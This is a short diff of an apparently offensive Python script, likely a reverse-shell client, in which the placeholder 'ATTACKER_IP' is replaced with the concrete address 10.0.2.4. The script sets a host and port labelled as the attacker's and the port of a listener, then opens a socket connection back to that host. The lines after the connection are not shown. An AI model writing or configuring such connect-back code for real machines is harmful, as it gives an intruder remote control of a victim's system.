@@ -119,7 +119,7 @@ import subprocess
 import os
 import base64
 
-HOST = 'ATTACKER_IP'  # Attacker's IP address
+HOST = '10.0.2.4'  # Attacker's IP address
 PORT = 12345  # Same port number used in the listener
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((HOST, PORT))
